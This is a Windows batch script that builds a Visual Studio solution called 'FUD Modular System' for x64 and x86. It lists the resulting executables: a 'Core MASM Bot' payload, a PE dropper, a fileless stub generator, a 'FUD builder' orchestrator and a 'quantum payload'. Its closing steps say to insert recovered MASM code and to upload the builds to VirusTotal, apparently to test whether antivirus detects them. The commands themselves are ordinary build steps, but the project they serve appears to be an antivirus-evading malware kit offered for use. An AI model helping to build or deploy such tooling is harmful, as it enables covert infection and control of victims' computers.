@echo off
echo ===============================================================================
echo FUD Modular System - Visual Studio 2022 Build Script
echo ===============================================================================

REM Check if Visual Studio is available
where msbuild >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: MSBuild not found. Please ensure Visual Studio 2022 is installed.
    echo Make sure to run this from a Visual Studio Developer Command Prompt.
    pause
    exit /b 1
)

echo Building FUD Modular System with Visual Studio 2022...
echo.

REM Create build directories
if not exist "build\bin\x64\Release" mkdir "build\bin\x64\Release"
if not exist "build\bin\x86\Release" mkdir "build\bin\x86\Release"
if not exist "build\bin\x64\Debug" mkdir "build\bin\x64\Debug"
if not exist "build\bin\x86\Debug" mkdir "build\bin\x86\Debug"

REM Build Release x64
echo Building Release x64...
msbuild FUD_Modular_System.sln /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143
if %errorlevel% neq 0 (
    echo ERROR: Build failed for Release x64
    pause
    exit /b 1
)

REM Build Release x86
echo Building Release x86...
msbuild FUD_Modular_System.sln /p:Configuration=Release /p:Platform=Win32 /p:PlatformToolset=v143
if %errorlevel% neq 0 (
    echo ERROR: Build failed for Release x86
    pause
    exit /b 1
)

REM Build Debug x64
echo Building Debug x64...
msbuild FUD_Modular_System.sln /p:Configuration=Debug /p:Platform=x64 /p:PlatformToolset=v143
if %errorlevel% neq 0 (
    echo ERROR: Build failed for Debug x64
    pause
    exit /b 1
)

REM Build Debug x86
echo Building Debug x86...
msbuild FUD_Modular_System.sln /p:Configuration=Debug /p:Platform=Win32 /p:PlatformToolset=v143
if %errorlevel% neq 0 (
    echo ERROR: Build failed for Debug x86
    pause
    exit /b 1
)

echo.
echo ===============================================================================
echo Build Complete!
echo ===============================================================================
echo.
echo Executables created:
echo.
echo Release x64:
if exist "build\bin\x64\Release\core_payload.exe" echo   - Core MASM Bot: build\bin\x64\Release\core_payload.exe
if exist "build\bin\x64\Release\pe_dropper.exe" echo   - PE Builder: build\bin\x64\Release\pe_dropper.exe
if exist "build\bin\x64\Release\fileless_stub.exe" echo   - Stub Generator: build\bin\x64\Release\fileless_stub.exe
if exist "build\bin\x64\Release\fud_builder.exe" echo   - Orchestrator: build\bin\x64\Release\fud_builder.exe
if exist "build\bin\x64\Release\quantum_payload.exe" echo   - Quantum Module: build\bin\x64\Release\quantum_payload.exe
echo.
echo Release x86:
if exist "build\bin\x86\Release\core_payload.exe" echo   - Core MASM Bot: build\bin\x86\Release\core_payload.exe
if exist "build\bin\x86\Release\pe_dropper.exe" echo   - PE Builder: build\bin\x86\Release\pe_dropper.exe
if exist "build\bin\x86\Release\fileless_stub.exe" echo   - Stub Generator: build\bin\x86\Release\fileless_stub.exe
if exist "build\bin\x86\Release\fud_builder.exe" echo   - Orchestrator: build\bin\x86\Release\fud_builder.exe
if exist "build\bin\x86\Release\quantum_payload.exe" echo   - Quantum Module: build\bin\x86\Release\quantum_payload.exe
echo.
echo Debug x64:
if exist "build\bin\x64\Debug\core_payload.exe" echo   - Core MASM Bot: build\bin\x64\Debug\core_payload.exe
if exist "build\bin\x64\Debug\pe_dropper.exe" echo   - PE Builder: build\bin\x64\Debug\pe_dropper.exe
if exist "build\bin\x64\Debug\fileless_stub.exe" echo   - Stub Generator: build\bin\x64\Debug\fileless_stub.exe
if exist "build\bin\x64\Debug\fud_builder.exe" echo   - Orchestrator: build\bin\x64\Debug\fud_builder.exe
if exist "build\bin\x64\Debug\quantum_payload.exe" echo   - Quantum Module: build\bin\x64\Debug\quantum_payload.exe
echo.
echo Debug x86:
if exist "build\bin\x86\Debug\core_payload.exe" echo   - Core MASM Bot: build\bin\x86\Debug\core_payload.exe
if exist "build\bin\x86\Debug\pe_dropper.exe" echo   - PE Builder: build\bin\x86\Debug\pe_dropper.exe
if exist "build\bin\x86\Debug\fileless_stub.exe" echo   - Stub Generator: build\bin\x86\Debug\fileless_stub.exe
if exist "build\bin\x86\Debug\fud_builder.exe" echo   - Orchestrator: build\bin\x86\Debug\fud_builder.exe
if exist "build\bin\x86\Debug\quantum_payload.exe" echo   - Quantum Module: build\bin\x86\Debug\quantum_payload.exe
echo.
echo ===============================================================================
echo Next Steps:
echo 1. Replace quantum_module\quantum_payload.c with your recovered MASM code
echo 2. Run the Orchestrator: build\bin\x64\Release\fud_builder.exe
echo 3. Test individual components
echo 4. Upload to VirusTotal for testing
echo ===============================================================================
echo.
pause